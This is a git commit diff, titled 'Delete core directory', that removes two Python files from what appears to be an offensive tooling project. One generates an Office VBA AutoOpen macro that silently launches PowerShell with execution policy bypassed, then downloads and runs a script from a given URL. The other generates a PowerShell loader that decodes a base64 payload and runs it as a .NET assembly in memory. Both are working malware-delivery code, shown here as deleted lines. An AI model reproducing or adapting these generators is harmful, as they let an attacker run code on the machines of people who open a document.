8277f7d7ce85d567e44a31d86f8727cca92459d3
WebDragon <117004849+webdragon63@users.noreply.github.com>
2025-06-12 16:49:47 +0000

    Delete core directory

--- core/loader/macro_generator.py
+++
@@ -1,9 +0,0 @@
-def generate_macro(ps_url):
-    return f"""
-Sub AutoOpen()
-    Dim objShell As Object
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('{ps_url}')"
-End Sub
-"""
-
--- core/loader/powershell_loader.py
+++
@@ -1,9 +0,0 @@
-def generate(encoded_payload):
-    ps_template = f"""
-$payload = "{encoded_payload}"
-$bytes = [System.Convert]::FromBase64String($payload)
-$assembly = [System.Reflection.Assembly]::Load($bytes)
-$assembly.EntryPoint.Invoke($null, (, [string[]] @()))
-"""
-    return ps_template
-
